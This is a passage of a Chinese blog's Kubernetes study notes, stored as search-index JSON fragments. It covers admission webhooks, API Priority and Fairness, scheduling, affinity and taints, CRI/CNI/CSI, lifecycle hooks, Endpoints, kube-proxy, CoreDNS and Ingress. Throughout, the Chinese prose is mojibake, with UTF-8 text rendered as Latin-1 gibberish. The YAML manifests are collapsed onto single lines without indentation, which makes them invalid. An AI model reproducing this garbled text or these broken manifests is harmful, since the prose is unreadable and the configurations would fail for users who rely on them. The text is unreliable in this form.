è®¾ç½®é»˜è®¤çš„ StorageClass ä¸€ä¸ªæœ‰ç”¨çš„åœºæ™¯å°±æ˜¯åˆ›å»ºä¸€ä¸ª ResourceQuotaControllerï¼Œå½“ Namespace åˆ›å»ºæ—¶è‡ªåŠ¨åˆ›å»º ResourceQuotaï¼Œä½¿å¾— ResourceQuota æ’ä»¶ç”Ÿæ•ˆï¼Œä»è€Œèƒ½å¤Ÿé™åˆ¶ç”¨æˆ·çš„èµ„æºé…é¢ã€‚ æ¯«æ— ç–‘é—®ï¼Œå‡†å…¥æ’ä»¶èƒ½åšåˆ°éå¸¸å¤šçš„äº‹æƒ…ï¼Œå› æ­¤ Kubernetes ä¸€å®šä¼šå…è®¸æˆ‘ä»¬è‡ªå®šä¹‰è¿™æ ·çš„æ’ä»¶ã€‚å¦‚æœæˆ‘ä»¬åªå¯¹å‡†å…¥å¯¹è±¡è¿›è¡Œæ ¡éªŒè€Œä¸ä½œä¿®æ”¹ï¼Œé‚£ä¹ˆå¯ä»¥é…ç½® ValidatingWebhookConfigurationï¼›åä¹‹ï¼Œå¦‚æœéœ€è¦ä¿®æ”¹å‡†å…¥å¯¹è±¡ï¼Œå°±éœ€è¦ MutatingWebhookConfiguration äº†ã€‚ ä¸€ä¸ªç®€å•çš„ MutatingWebhook çš„ä¾‹å­å¯ä»¥åœ¨ è¿™é‡Œ æ‰¾åˆ°ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:8:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"é™æµ API Server ä½¿ç”¨ max-requests-inflight é™åˆ¶ç»™å®šæ—¶é—´å†…æœ€å¤§ non-mutating è¯·æ±‚æ•°ï¼Œç”¨ max-mutating-requests-inflight é™åˆ¶ç»™å®šæ—¶é—´å†…æœ€å¤§ mutating è¯·æ±‚æ•°ã€‚è¿™ä¸¤ä¸ªå€¼ä¼šéšç€èŠ‚ç‚¹æ•°çš„å¢åŠ è€Œå¢åŠ ã€‚ ç„¶è€Œï¼Œè¿™ç±»ä¼ ç»Ÿé™æµæ–¹å¼å­˜åœ¨è¯¸å¤šå±€é™æ€§ï¼š ç²’åº¦è¾ƒç²—ï¼Œæ— æ³•ä¸ºä¸åŒåœºæ™¯è®¾ç½®ä¸åŒé™æµç­–ç•¥ å•ä¸€é˜Ÿåˆ—ï¼Œä½¿å¾—æ¶æ„æµé‡èƒ½å¤Ÿå½±å“æ­£å¸¸æµé‡ å®¹æ˜“äº§ç”Ÿé¥¥é¥¿é—®é¢˜ ç¼ºå°‘ä¼˜å…ˆçº§ï¼Œç³»ç»ŸæŒ‡ä»¤åŒæ ·è¢«é™æµ å› æ­¤ï¼ŒAPI Server ä½¿ç”¨ API Priority and Fairness åœ¨æ›´ç»†ç²’åº¦ä¸Šåˆ†ç±»è¯·æ±‚å¹¶åˆ†åˆ«é™æµã€‚æ¯ä¸€ä¸ªåˆ†ç±»å¯¹åº”ä¸€ç§ FlowSchemaï¼ŒåŒä¸€ FlowSchema å†…çš„è¯·æ±‚åˆä¼šè¢« distinguisher åˆ†åˆ°ä¸åŒçš„ Flow ä¸­ã€‚æœ€åï¼ŒAPF ä½¿ç”¨æ··æ´—åˆ†ç‰‡æŠ€æœ¯å°†è¯·æ±‚åˆ†é…åˆ°ä¸åŒé˜Ÿåˆ—ä¸­ã€‚è¿™ç§æ’é˜Ÿæœºåˆ¶æ—¢é˜²æ­¢äº†é¥¥é¥¿é—®é¢˜ï¼Œåˆèƒ½ä¸€å®šç¨‹åº¦ä¸Šåº”å¯¹çªå‘æµé‡ã€‚ apiVersion:flowcontrol.apiserver.k8s.io/v1beta1kind:FlowSchemametadata:name:kube-schedulerspec:distinguisherMethod:type:ByNamespace # A FlowSchema and a distinguisher identify a flowmatchingPrecedence:800# rule prioritypriorityLevelConfiguration:name:workload-high # queue priorityrules:- resourceRules:- resources:- '*'verbs:- '*'subjects:- kind:Useruser:name:system:kube-scheduler åœ¨å¦ä¸€ä¸ªç»´åº¦ä¸Šï¼ŒPriority è®¾ç½®äº†è¯·æ±‚çš„ä¼˜å…ˆçº§ã€‚ä¸åŒä¼˜å…ˆçº§ä¹‹é—´çš„è¯·æ±‚åŒæ ·ç›¸äº’éš”ç¦»ï¼Œå¹¶ä¸”æ‹¥æœ‰ç‹¬ç«‹çš„å¹¶å‘é™åˆ¶ã€‚å¯¹äºç³»ç»ŸæŒ‡ä»¤ç±»çš„æµé‡ï¼Œè¿˜å¯ä»¥è®¾ç½®ä¸ºè±å…æµé‡ï¼Œä¸å—åˆ°é™æµçš„é™åˆ¶ã€‚ apiVersion:flowcontrol.apiserver.k8s.io/v1beta1kind:PriorityLevelConfigurationmetadata:name:global-defaultspec:limited:assuredConcurrencyShares:20# max concurrent requests allowedlimitResponse:queuing:handSize:6# number of queues per flowqueueLengthLimit:50# max queue lengthqueues:128# queue numbertype:Queuetype:Limited ","date":"2021-10-10","objectID":"/kubernetes/:8:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Scheduler ","date":"2021-10-10","objectID":"/kubernetes/:9:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"èµ„æºéœ€æ±‚ å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œè°ƒåº¦å™¨å¯ä»¥ä½¿ç”¨ nodeSelector è°ƒåº¦ Pod åˆ°æŒ‡å®šçš„ Node ä¸Šï¼Œä¹Ÿå¯ä»¥é€šè¿‡ Pod çš„èµ„æºéœ€æ±‚æ¥è°ƒåº¦ Podã€‚æ­¤æ—¶ï¼Œè°ƒåº¦å™¨å…³æ³¨çš„æ˜¯ .spec.resources.requests ï¼Œè€Œ cgroups åˆ™ä½¿ç”¨ .spec.resources.limits é™åˆ¶ Pod ä¸­çš„ container èƒ½ä½¿ç”¨çš„èµ„æºä¸Šé™ã€‚ä¾‹å¦‚ï¼Œcpu: 1 æ„å‘³ç€å®¹å™¨å¯ä»¥è·å¾—ä¸€ä¸ª CPU çš„å…¨éƒ¨æ—¶é—´ç‰‡ï¼Œè€Œ cpu: 1m åˆ™è¡¨ç¤ºä¸€ä¸ª CPU çš„å…¨éƒ¨æ—¶é—´ç‰‡çš„åƒåˆ†ä¹‹ä¸€ã€‚ æ ¹æ® resources å­—æ®µçš„è®¾ç½®ï¼Œcontainer çš„èµ„æºéœ€æ±‚å¯ä»¥åˆ†ä¸ºä¸‰ç§ qosClassï¼ˆå¯¹åº”çš„ QoS ä»é«˜åˆ°ä½ï¼‰ï¼š Guaranteeï¼šresources ä¸‹çš„ request ç­‰äº limit Burstableï¼šresources ä¸‹çš„ request å°äº limit BestEffortï¼šä¸è®¾ç½® resources å­—æ®µ å½“èŠ‚ç‚¹èµ„æºä¸è¶³æ—¶ï¼Œä¼šæŒ‰ BestEffortã€Burstableã€Guarantee çš„é¡ºåºä¾æ¬¡é©±é€ Podã€‚ åŒæ—¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ LimitRange æ¥ç»™æ‰€æœ‰æ²¡æœ‰è®¾ç½® resources çš„ containerï¼ˆåŒ…æ‹¬ initContainersï¼‰åŠ ä¸Šé»˜è®¤çš„ resources å­—æ®µï¼š apiVersion:v1kind:LimitRangemetadata:name:mem-limit-rangespec:limits:- default:memory:512MidefaultRequest:memory:256Mitype:Container ","date":"2021-10-10","objectID":"/kubernetes/:9:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Affinity å¦ä¸€ç§è°ƒåº¦æ–¹å¼æ˜¯æ ¹æ® Pod çš„ nodeAffinity å’Œ nodeAntiAffinityã€‚requiredDuringSchedulingIgnoredDuringExecution å’Œ preferredDuringSchedulingIgnoredDuringExecution åˆ†åˆ«è¡¨ç¤ºå¼ºäº²å’Œæ€§å’Œå¼±äº²å’Œæ€§ï¼Œå‰è€…åœ¨æ‰¾ä¸åˆ°äº²å’Œçš„ Node æ—¶ä¸ä¼šè¿è¡Œã€‚ å¼ºäº²å’Œæ€§ Pod è¯­æ³•å¦‚ä¸‹ï¼š template:metadata:labels:app:nginxspec:affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:nodeSelectorTerms:- matchExpressions:- key:disktypeoperator:Invalues:- ssdcontainers:- name:nginximage:nginx å¼±äº²å’Œæ€§ï¼š spec:affinity:nodeAffinity:preferredDuringSchedulingIgnoredDuringExecution:- weight:1preference:matchExpressions:- key:disktypeoperator:Invalues:- ssd åŒç†ï¼Œå¯ä»¥ç”¨ podAffinity å’Œ podAntiAffinity æŒ‡å®š Pod é—´äº²å’Œæ€§ï¼Œå³åˆ¤æ–­æŸä¸€ä¸ªèŒƒå›´å†…ï¼ˆç”± topologyKey æŒ‡å®šï¼‰ç°æœ‰çš„ Pod æ˜¯å¦æ»¡è¶³ç›¸åº”æ¡ä»¶æ¥è¿›è¡Œè°ƒåº¦ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:9:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Taint å’Œ Toleration Taint ä¼šç»™ Node åŠ æ±¡ç‚¹ï¼Œæ¥é˜²æ­¢ä»»æ„ Pod è¢«è°ƒåº¦åˆ°è¯¥ Node ä¸Šã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç»™éƒ¨åˆ† Pod æŒ‡å®š Tolerationï¼Œä½¿å¾—è¿™äº› Pod èƒ½å¤Ÿå®¹å¿è¿™äº›æ±¡ç‚¹å¹¶è¢«è°ƒåº¦åˆ°è¯¥ Node ä¸Šã€‚ å­˜åœ¨ä¸‰ç§æ±¡ç‚¹ç±»å‹ï¼š NoSchedule ä¼šä½¿å¾—æ–° Pod ä¸å†è°ƒåº¦åˆ°è¯¥ Node ä¸Šï¼Œä½†ç°æœ‰ Pod ä¸å—å½±å“ PreferNoSchedule ä¼šä½¿å¾—æ–° Pod å°½é‡ä¸è°ƒåº¦åˆ°è¯¥ Node ä¸Šï¼Œä½†ç°æœ‰ Pod ä¸å—å½±å“ NoExecute ä¼šä½¿å¾—æ–° Pod ä¸å†è°ƒåº¦åˆ°è¯¥ Node ä¸Šï¼Œä¸”å¯¹äºç°æœ‰ Podï¼Œä¼šåœ¨ Pod çš„ tolerationSeconds ç§’åï¼Œé©±é€å¯¹åº”çš„ Pod ä¾‹å¦‚ï¼Œå…ˆç»™æŸä¸ª Node åŠ æ±¡ç‚¹ï¼š $ k taint no node0 key=value:NoSchedule éšååˆ›å»º Podï¼Œä¼šå‘ç°æ— æ³•è°ƒåº¦åˆ°è¯¥ Node ä¸Šï¼Œç›´åˆ°æˆ‘ä»¬å–æ¶ˆè¿™ä¸ªæ±¡ç‚¹ï¼š $ k taint no node0 key=value:NoSchedule- æˆ–æ˜¯ç»™æ–°çš„ Pod æ·»åŠ  Tolerationï¼š template:metadata:labels:app:nginxspec:containers:- name:nginximage:nginxtolerations:- key:keyoperator:Equalvalue:valueeffect:NoSchedule ","date":"2021-10-10","objectID":"/kubernetes/:9:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"PriorityClass æœ€åï¼Œå¯ä»¥ä¸º Pod è®¾ç½®è°ƒåº¦ä¼˜å…ˆçº§ã€‚é¦–å…ˆå®šä¹‰ PriorityClassï¼š apiVersion:v1kind:PriorityClassmetadata:name:high-priorityvalue:1000000globalDefault:falsedescription:\"the greater the value, the higher the priority\" éšååœ¨ Pod ä¸­è®¾ç½®è¯¥ PriorityClassï¼š template:metadata:labels:app:nginxspec:containers:- name:nginximage:nginxpriorityClassName:high-priority ","date":"2021-10-10","objectID":"/kubernetes/:9:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"CRI / CNI / CSI ","date":"2021-10-10","objectID":"/kubernetes/:10:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"CRI å¸¸è§çš„å®¹å™¨è¿è¡Œæ—¶æ¥å£åŒ…æ‹¬ Dockerã€containerdã€CRI-O ç­‰ï¼Œé‡‡ç”¨çš„æ˜¯ä¸»æµçš„ runc è§„èŒƒã€‚ç”±äº Docker æœ¬èº«æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„äº§å“ï¼Œç”¨åœ¨ Kubernetes é‡Œæ˜¾å¾—è¾ƒé‡ã€‚è€Œ containerd åˆ™åœ¨å®ç°ä¸Šå’Œä½¿ç”¨ä¸Šéƒ½æ›´ä¸ºè½»é‡â€”â€”å®é™…ä¸Šï¼Œå³ä½¿ä½¿ç”¨ Docker ä½œä¸º CRIï¼ŒKubernetes åº•å±‚ä¾ç„¶æ˜¯ç»ç”± Dockerï¼Œä»è€Œåœ¨ containerd ä¸­è¿è¡Œå®¹å™¨çš„ã€‚ å› æ­¤ï¼Œå¯ä»¥è¯´ç›®å‰ Kubernetes æœ€åˆé€‚çš„ CRI æ˜¯ containerdã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:10:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"CNI åœ¨ Kubernetes ä¸­ï¼Œç½‘ç»œæ¨¡å‹æ˜¯éå¸¸ç›´è§‚ã€ç¬¦åˆç›´è§‰çš„ï¼š æ¯ä¸ª Pod éƒ½æœ‰è‡ªå·±çš„ IP åœ°å€ï¼Œä½†æ¯æ¬¡é‡å»ºåå¯èƒ½å‘ç”Ÿå˜åŒ– åŒä¸€ä¸ª Pod ä¸­çš„å®¹å™¨å…±äº«ç½‘ç»œ Namespaceï¼Œå› æ­¤å¯ç›´æ¥é€šè¿‡ localhost é€šä¿¡ Pod çš„ IP å¯¹æ•´ä¸ªé›†ç¾¤å¯è§ï¼Œé›†ç¾¤ä¸­ä»»æ„ Pod æˆ– Node è®¿é—®ä¸€ä¸ª Pod éƒ½æ— éœ€ç»è¿‡ NAT ç”±äº Pod çš„ IP åœ°å€ä¸ç¨³å®šï¼Œå¯ä»¥é€šè¿‡ Service æ¥è®¿é—® Podï¼ŒåŒæ—¶ Service æœ¬èº«å…·å¤‡è´Ÿè½½å‡è¡¡åŠŸèƒ½ ä¸ºäº†è®©å„å‚å•†ä¸åŒçš„ç½‘ç»œæ ‡å‡†å’Œå·¥å…·éƒ½èƒ½ç¬¦åˆè¿™ç§ç½‘ç»œæ¨¡å‹ï¼Œä¹Ÿä¸ºäº†è®©ç½‘ç»œèƒ½ä¸å„ç§ CRI å…¼å®¹ï¼ŒKubernetes é‡‡ç”¨å®¹å™¨ç½‘ç»œæ¥å£è§„èŒƒï¼Œé€šè¿‡æ’ä»¶çš„å½¢å¼æ„å»ºç½‘ç»œã€‚æ’ä»¶ä¸­ä¸€èˆ¬ä¼šå®šä¹‰å¦‚ä½•åˆ†é… IPã€å¦‚ä½•è®¾ç½®ç½‘å¡ã€å¦‚ä½•é™æµã€å¦‚ä½•è®¾ç½®é˜²ç«å¢™ã€å¦‚ä½•ç«¯å£è½¬å‘ç­‰ç­‰ã€‚å¸¸è§çš„æ’ä»¶åŒ…æ‹¬ Flannelã€Calicoã€Cilium ç­‰ã€‚ ä¾‹å¦‚ï¼ŒCalico å¯¹åŒç½‘æ®µé€šä¿¡é‡‡ç”¨ BGP åè®®æ¥è·¯ç”±æ•°æ®åŒ…ï¼Œæ­¤æ—¶ä¸éœ€è¦å°åŒ…ï¼›å¯¹è·¨ç½‘æ®µé€šä¿¡ï¼Œåˆ™ä½¿ç”¨ IPinIP å°è£… IP æ•°æ®åŒ…ã€‚æ­¤å¤–ï¼ŒCalico æ”¯æŒä½¿ç”¨ ACLs åè®®å’Œ kube-proxy æ¥åˆ›å»º iptables è¿‡æ»¤è§„åˆ™ï¼Œä»è€Œéš”ç¦»å®¹å™¨ç½‘ç»œã€‚ åœ¨è°ƒç”¨ä»»ä½•æ’ä»¶å‰ï¼ŒCRI å¿…é¡»å…ˆåˆ›å»ºä¸€ä¸ªç½‘ç»œ Namespaceã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸€ä¸ªè¿è¡Œçš„ Pod ä¸­å³ä½¿åªå£°æ˜äº†ä¸€ä¸ªå®¹å™¨ï¼Œä¹Ÿä¼šå‡ºç°å¦å¤–ä¸€ä¸ª pause å®¹å™¨ï¼ˆè¿™ä¸€æ­¥ç§°ä¸º createPodSandboxï¼‰ã€‚pause å®¹å™¨åªè¿è¡Œ sleep infinity ï¼Œå‡ ä¹ä¸å  CPU å’Œå†…å­˜ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯ä¸ºäº†ä¸ºå½“å‰ Pod åˆ›å»ºå¥½ç½‘ç»œ Namespace ä¾›åŒä¸€ Pod ä¸­å…¶ä»–å®¹å™¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å£°æ˜çš„å®¹å™¨ä½¿ç”¨ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:10:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"CSI å®¹å™¨å­˜å‚¨æ¥å£æ–¹é¢ï¼Œé€‰æ‹©å°±æ¯”è¾ƒå•ä¸€äº†ï¼Œå› ä¸º OverlayFS æ€§èƒ½è¿‡äºå¼ºåŠ¿ã€‚Docker å’Œ containerd ä¹Ÿé»˜è®¤ä½¿ç”¨ OverlayFS ä½œä¸ºè¿è¡Œæ—¶å­˜å‚¨é©±åŠ¨ã€‚ä¸Šæ–‡æåˆ°çš„ emptyDirã€hostPathã€PV å’Œ PVCã€å¤–éƒ¨å­˜å‚¨ç­‰ï¼Œéƒ½å®ç°äº† CSI æ¥å£ï¼Œå› æ­¤å¯ä»¥åœ¨ä¸åŒåœºæ™¯ä¸‹ä¸º Pod æ‰€æŒ‚è½½å¹¶ä½¿ç”¨ã€‚CSI ä¹ŸåŒæ ·æ”¯æŒæ’ä»¶ç³»ç»Ÿã€‚ kubelet åˆ›å»º Pod æ—¶é¦–å…ˆä¼šè°ƒç”¨ CSI æ¥å£ï¼Œåˆå§‹åŒ–å®¹å™¨å­˜å‚¨ï¼Œæ¯”å¦‚æŒ‚è½½ Volume ç­‰ï¼›éšå createPodSandbox å‡†å¤‡å¥½ pause å®¹å™¨å¹¶è¿è¡Œï¼›æ¥ç€è°ƒç”¨ CRI çš„æ¥å£ï¼Œå¯åŠ¨å®¹å™¨ã€åˆ›å»ºå¥½ Pod çš„ç½‘ç»œ Namespaceï¼Œä¸ºæ„å»ºç½‘ç»œä½œå¥½å‡†å¤‡ï¼›æœ€åæ‰è°ƒç”¨ CNI çš„æ¥å£çœŸæ­£æ„å»ºå®¹å™¨ç½‘ç»œã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:10:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Pod ç”Ÿå‘½å‘¨æœŸé’©å­ å’Œ Vue é‡Œçš„ç”Ÿå‘½å‘¨æœŸé’©å­ç±»ä¼¼ï¼ŒPod ä¸­çš„ container ä¹Ÿå¯ä»¥å®šä¹‰ postStart é’©å­å’Œ preStop é’©å­ã€‚postStart é’©å­åœ¨å®¹å™¨å¯åŠ¨åè¿è¡Œï¼Œä½†æ— æ³•ä¿è¯å…¶å’Œå®¹å™¨ Entrypoint è°å…ˆæ‰§è¡Œï¼Œè¿è¡Œå®Œ postStart åå®¹å™¨æ‰ä¼šè¢«æ ‡è®°ä¸º Runningã€‚ preStop åˆ™åªæœ‰åœ¨ Pod è¢«åˆ é™¤æ—¶ï¼ˆè€Œä¸æ˜¯å®Œæˆæ—¶ / å®¹å™¨é€€å‡ºæ—¶ï¼‰æ‰ä¼šæ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ¯•å Kubernetes ä¼šå‘å®¹å™¨å‘é€ SIGTERM ä¿¡å·ã€‚å¦‚æœ preStop æ‰§è¡Œæ—¶é—´å’Œå®¹å™¨æ”¶åˆ° SIGTERM åèŠ±è´¹çš„æ—¶é—´åŠ èµ·æ¥è¶…è¿‡äº† terminationGracePeriodSecondsï¼Œé‚£ä¹ˆå®¹å™¨å°±ä¼šæ”¶åˆ° SIGKILL ä¿¡å·å¼ºåˆ¶é€€å‡ºã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œbash / sh ä¼šå¿½ç•¥ SIGTERM ä¿¡å·ï¼Œè¿™ä½¿å¾— terminationGracePeriodSeconds å¤±å»æ„ä¹‰ã€‚å› æ­¤ï¼Œç”¨ bash / sh ä½œä¸ºå®¹å™¨ Entrypoint æ—¶ï¼Œåº”è®¾ç½®å°½é‡å°çš„è¶…æ—¶æ—¶é—´ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:11:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"æœåŠ¡å‘ç°ä¸è´Ÿè½½å‡è¡¡ ","date":"2021-10-10","objectID":"/kubernetes/:12:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Endpoint å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª selector ä¸ä¸ºç©ºçš„ Service æ—¶ï¼ŒEndpoint Controller ä¼šç›‘å¬åˆ°è¿™ä¸€äº‹ä»¶å¹¶åˆ›å»ºåŒåçš„ Endpoint å¯¹è±¡ã€‚æ»¡è¶³ selector è¦æ±‚çš„æ‰€æœ‰ Pod çš„ IP éƒ½ä¼šè¢«é…ç½®åˆ° Endpoint çš„åœ°å€åˆ—è¡¨ä¸­ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡ k get po -owide æŸ¥çœ‹ä¸€ä¸ª Deployment ä¸­ä¸€ç»„ Pod çš„ IPï¼Œåˆ†åˆ«ä¸º 10.1.1.114ã€10.1.1.111ã€10.1.1.112ã€‚éšåæŸ¥çœ‹å¯¹åº” Service æ‰€å¯¹åº”çš„ Endpointï¼š $ k describe ep nginx-svc Name: nginx-svc Namespace: default Labels: \u003cnone\u003e Annotations: endpoints.kubernetes.io/last-change-trigger-time: 2021-11-26T12:37:50Z Subsets: Addresses: 10.1.1.111,10.1.1.112,10.1.1.114 NotReadyAddresses: \u003cnone\u003e Ports: Name Port Protocol ---- ---- -------- \u003cunset\u003e 80 TCP Events: \u003cnone\u003e å¯ä»¥åœ¨ Subsets ä¸‹çš„ Addresses é‡Œå‘ç°è¿™ä¸‰ä¸ªåœ°å€ï¼Œè¯´æ˜å®é™…è¿›è¡Œæµé‡è½¬å‘çš„æ˜¯ Service åº•å±‚çš„ Endpoint å¯¹è±¡ã€‚ å¦‚æœä¸ä¸º Service å®šä¹‰ selectorï¼Œé‚£ä¹ˆå°±ä¸ä¼šåˆ›å»ºå¯¹åº”çš„ Endpointã€‚æ­¤æ—¶å¯ä»¥æ‰‹åŠ¨åˆ›å»º Endpoint æŒ‡å‘æŒ‡å®šçš„åœ°å€ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:12:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"kube-proxy æµé‡çš„è½¬å‘æ˜¯ kube-proxy çš„ä¸»è¦ä»»åŠ¡ä¹‹ä¸€ã€‚kube-proxy ä½¿ç”¨ iptables ä¸­é…ç½®çš„è½¬å‘è§„åˆ™ï¼Œä»¥ 1/n çš„æ¦‚ç‡è½¬å‘åˆ° n ä¸ª IP ä¸­çš„æŸä¸€ä¸ªä¸Šã€‚ä¸ºäº†è§£å†³åœ¨è½¬å‘è§„æ¨¡è¾ƒå¤§æ—¶ iptables çš„æ€§èƒ½é—®é¢˜ã€ä»¥åŠåŸºäºæ¦‚ç‡çš„ä¼ªè´Ÿè½½å‡è¡¡é—®é¢˜ï¼Œç›®å‰å¯ä»¥é‡‡ç”¨ ipvs é…ç½®æ›´ç®€æ´çš„è§„åˆ™å’Œæ›´ä¸°å¯Œçš„è´Ÿè½½å‡è¡¡ç±»å‹ï¼Œå¦‚ round-robin ç­‰ã€‚ æ€»çš„æ¥è¯´ï¼Œå¤–éƒ¨æµé‡ä» API Server è¿›å…¥ï¼Œç»è¿‡ Service Controller -\u003e å¤–éƒ¨ Load Balancerï¼ˆå¦‚æœå­˜åœ¨ï¼‰ -\u003e kube-proxy -\u003e NodePort IPï¼ˆå¦‚æœå­˜åœ¨ï¼‰ -\u003e ClusterIPï¼ˆå¦‚æœå­˜åœ¨ï¼‰ çš„é¡ºåºæœ€ç»ˆåˆ°è¾¾ Pod IPã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:12:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"CoreDNS CoreDNS å°±æ˜¯ Kubernetes å†…éƒ¨çš„ DNS æœåŠ¡å™¨ã€‚å¯¹äºåŒ…å« ClusterIP çš„ Serviceï¼ŒCoreDNS éƒ½ä¼šåˆ›å»º $svcName.$namespace.svc.$clusterdomain: clusterIP çš„ A è®°å½•å’Œ PTR è®°å½•ï¼Œå¹¶ä¸ºç«¯å£åˆ›å»º SRV è®°å½•ã€‚å¦‚æœ Service æ˜¾å¼æŒ‡å®šäº† .spec.ClusterIP ä¸º Noneï¼Œé‚£ä¹ˆ CoreDNS ä¼šåˆ›å»ºå¤šæ¡ A è®°å½•ï¼Œåˆ†åˆ«æŒ‡å‘æ¯ä¸ª Ready çš„ Pod IPï¼Œæ ¼å¼ç±»ä¼¼ $podName.$svcName.$namespace.svc.$clusterdomainã€‚è€Œå¦‚æœ Service æŒ‡å®šäº† .spec.externalNameï¼Œé‚£ä¹ˆ CoreDNS åªä¼šåˆ›å»ºå¯¹åº”çš„ CNAME è®°å½•ã€‚ åœ¨æ¯ä¸ª Pod çš„ /etc/resolv.conf ä¸­ï¼Œéƒ½å¯ä»¥çœ‹åˆ° nameserver åœ°å€ï¼ˆä¹Ÿå°±æ˜¯ CoreDNS æœåŠ¡çš„åœ°å€ï¼‰å’Œæœç´¢è§„åˆ™ï¼ŒCoreDNS ä¾æ¬¡å°è¯•åœ¨è¦è§£æçš„åŸŸååæ·»åŠ è¿™äº›åŸŸåæ¥æ‹¼å‡‘å‡ºå®Œæ•´çš„åŸŸåã€‚ $ cat /etc/resolv.conf nameserver 10.96.0.10 search default.svc.cluster.local svc.cluster.local cluster.local options ndots:5 ","date":"2021-10-10","objectID":"/kubernetes/:12:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Ingress ä¸Šé¢æåˆ°çš„ Service è®¾ç½®çš„å¤–éƒ¨ LoadBalancerã€å’Œ kube-proxy åˆ©ç”¨ iptables / ipvs æä¾›çš„è´Ÿè½½å‡è¡¡åŠŸèƒ½ï¼Œéƒ½å±äº L4 è´Ÿè½½å‡è¡¡ï¼Œå·¥ä½œåœ¨ä¼ è¾“å±‚ã€‚è€Œ Ingress åˆ™æä¾›äº† L7 è´Ÿè½½å‡è¡¡ï¼Œä½œä¸ºå·¥ä½œåœ¨åº”ç”¨å±‚çš„ä»£ç†æœåŠ¡æ¥å®ç°è´Ÿè½½å‡è¡¡çš„åŠŸèƒ½ã€‚Ingress ä¸»è¦é‡‡ç”¨ TLS Termination æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Ingress å±‚é¢é…ç½® HTTPS è¯ä¹¦æ¥æä¾›ç»™å†…éƒ¨çš„å¤šä¸ªæœåŠ¡ä½¿ç”¨ã€‚ ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ–¹æ³•æ˜¯é€šè¿‡ Secret é…ç½®è¯ä¹¦ï¼š apiVersion:v1kind:Secretmetadata:name:httpserver-tlstype:kubernetes.io/tlsdata:tls.crt:# Base64(PEM format file)tls.key:# Base64(PEM format file) éšåé…ç½® Ingress å¯¹è±¡ï¼š apiVersion:networking.k8s.io/v1kind:Ingressmetadata:name:httpserver-gatewayannotations:kubernetes.io/ingress.allow-http:'false'spec:tls:- hosts:- sigmerc.topsecretName:httpserver-tlsrules:- host:sigmerc.tophttp:paths:- path:/pathType:Prefixbackend:service:name:httpserver-serviceport:number:80 æ³¨æ„è¯ä¹¦å’ŒåŸŸåçš„åŒ¹é…é—®é¢˜ã€‚è¿™é‡Œå¯ä»¥æŒ‡å®šå¤šä¸ª pathï¼Œæ¯ä¸ª path å¯¹åº”ä¸€ä¸ª backend serviceã€‚ä¸€äº›ç‰¹æ€§åˆ™å¯ä»¥åœ¨ .metadata.annotations ä¸­å£°æ˜ï¼Œä¾‹å¦‚ç¦æ­¢ HTTP ç­‰ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:12:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes 